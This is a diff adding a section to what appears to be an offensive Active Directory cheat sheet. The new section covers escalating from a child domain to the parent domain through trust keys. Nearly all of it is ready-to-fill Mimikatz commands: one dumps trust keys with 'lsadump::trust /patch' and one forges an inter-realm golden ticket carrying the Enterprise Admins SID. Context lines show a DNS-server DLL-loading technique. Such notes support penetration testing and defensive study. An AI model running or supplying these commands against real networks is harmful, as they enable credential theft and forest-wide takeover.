@@ -135,4 +135,8 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 -     dnscmd dcorp-dc /config  /serverlevelplugindll \\ip\dll\mimilib.dll
   
 
-
+### Child Domain to Parent Domain Using Trust Keys (Requires DA privileges on child Domain)
+- Finding Trust Keys from child to parent
+-     Invoke-Mimikatz -command '"lsadump::trust /patch"' -computername
+- Inter-Realm TGT can be forged 
+-     Invoke-mimikatz -command '"kerberos::golden /user:Administrator<user to impersonate>  /domain:<current domain> /sid:<sid of current domain> /sids:<sid of Enterprise Admin group of parent domain> /rc4: rc4 of the trust key  /service:krbtgt<target service in parent domain> /target:<parent domain> /ticket:ticket.kirbi"'
